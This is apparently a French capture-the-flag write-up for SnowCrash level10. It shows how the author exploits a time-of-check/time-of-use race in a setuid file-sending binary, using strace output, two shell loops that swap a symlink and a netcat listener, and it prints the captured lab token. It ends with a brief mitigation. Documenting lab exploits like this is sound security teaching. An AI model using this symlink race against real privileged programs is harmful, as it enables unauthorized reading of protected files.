# Explication

Un `ls` nous montre encore 2 fichiers :

```sh
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```
- `level10` -> executable ayant les droits de flag10
- `token` -> fichier contenant le flag, on a pas les droits pour l'ouvrir

En executant `level10` on peut avoir une idee de ce qui nous attend :

```sh
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

Le programme semble etre un client qui se connecte a un server pour y envoyer un fichier.
On comprend que le client attend 2 arguments `./level10 [file][host]`.

La premiere etape au debut etait de savoir a quelle adresse communiquer, on connait le port `6969` car le client nous l'indique. Alors on commence a chercher des services qui ecoutent ce port sur la machine avec `ss` mais cela ne donne rien, en fait c'est a nous meme de creer ce `host` qui ecoutera sur une `address` et le port `6969` afin d'y envoyer notre fichier.

On a la possibilite de le faire avec `nc -v -l 6969` , par default si on ne met pas d'adresse c'est `0.0.0.0` qui sera utilise. Nous avons donc un host qui ecoute sur `0.0.0.0:6969` que l'on peut passer en deuxieme argument de `./level10`.

Maintenant on va essayer d'envoyer un fichier vers notre host :

Client :
```sh
level10@SnowCrash:~$ echo "test" > /tmp/test_file
level10@SnowCrash:~$ ./level10 /tmp/test_file 0.0.0.0
Connecting to 0.0.0.0:6969 .. Connected!
Sending file .. wrote file!
```

Server :

```sh
Connection from 127.0.0.1 port 6969 [tcp/*] accepted
.*( )*.
test
level10@SnowCrash:~$
```

Ok cela fonctionne, et on remarque que le contenu du fichier est sur la sortie de notre serveur, ils nous reste a faire la meme chose mais avec le token.

```sh
level10@SnowCrash:~$ ./level10 token 0.0.0.0
You don't have access to token
```

Evidemment cela ne fonctionne pas car on a aucun droit de lecture/ecriture sur ce fichier. Si on essaye de faire la meme chose que sur le `level08` cela ne marchera pas car ce n'est plus un simple check du nom du fichier , on peut le verifier grace a `strace ./level10 token 0.0.0.0.` qui permet de tracer les appels system d'un programme :

```sh
access("token", R_OK)                   = -1 EACCES (Permission denied)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "You don't have access to token\n", 31You don't have access to token
) = 31
```

Ce coup ci avec `access("token", R_OK)` on voit bien que le programme verifie que on a les droits suffisant pour utiliser ce fichier. Il va nous falloir trouver une autre solution.

En fait on peut utiliser quasiment la meme mechanique avec le systeme de `symlink` que dans le `level08`
On va faire ce que l'on appelle une attaque `Time of check / Time of use`, c'est a dire que on va exploiter le fait que le programme verifie quelque chose mais qu'il l'utilise plus tard ce qui nous laisse une fenetre pour changer cette chose entre temps.

Si on regarde comment va s'executer le progamme :

```sh
access("/tmp/test_file", R_OK)          = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "Connecting to 0.0.0.0:6969 .. ", 30Connecting to 0.0.0.0:6969 .. ) = 30
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
write(3, ".*( )*.\n", 8)                = 8
write(1, "Connected!\n", 11Connected!
)            = 11
write(1, "Sending file .. ", 16Sending file .. )        = 16
open("/tmp/test_file", O_RDONLY)        = 4
read(4, "test\n", 4096)                 = 5
write(3, "test\n", 5)                   = 5
write(1, "wrote file!\n", 12wrote file!
)           = 12
exit_group(12)
```

On voit que plus tot `access("/tmp/test_file", R_OK) = 0` verifie que j'ai bien les droits sur le fichier que je veux utiliser et ensuite plus tard `open("/tmp/test_file", O_RDONLY) = 4` essaiera d'ouvrir le fichier avec les droits SUID de `flag10`.

Ce que on va essayer de faire c'est de creer un `symlink` vers un fichier qui passe la verification de `access()` comme mon fichier `/tmp/test_file` , et ensuite on va changer le lien pour le mettre sur le fichier `token`, finalement cela ressemble un peu a un data race. Il va falloir le faire rapidement car le programme s'execute tres vite et ce ne serai pas possible de le faire manuellement.

On va donc faire 2 boucles dans le shell :

- Une qui fait `./level10 /tmp/my_symlink 0.0.0.0.`
```sh
while true; do
./level10 /tmp/my_symlink 0.0.0.0;
 done
```

- Une qui fait swap le symlink entre un fichier valide `/tmp/test_file` et `token`
```sh
level10@SnowCrash:~$ while true; do
> ln -sf /tmp/test_file /tmp/my_symlink
> ln -sf /home/user/level10/token /tmp/my_symlink
> done
```

Le serveur se coupe a chaque fois qu'il recoit une entree mais si on le relance plusieurs fois on va voir que notre bypass a reussi par moment :

```sh
level10@SnowCrash:~$ nc -v -l 6969
Connection from 127.0.0.1 port 6969 [tcp/*] accepted
.*( )*.
test1
level10@SnowCrash:~$ nc -v -l 6969
Connection from 127.0.0.1 port 6969 [tcp/*] accepted
.*( )*.
woupa2yuojeeaaed06riuj63c
level10@SnowCrash:~$ nc -v -l 6969
Connection from 127.0.0.1 port 6969 [tcp/*] accepted
.*( )*.
test1
```

Le mot de passe de `flag10` est donc `woupa2yuojeeaaed06riuj63c`.

## Comment eviter cette attaque

Il faudrait ouvrir le fichier une seule fois et verifier les droits ensuite grace a son descripteur de fichier que on a obtenu. Il est surement possible de refuser des symlink qui on l'air des tres exploiter pour les fichiers.
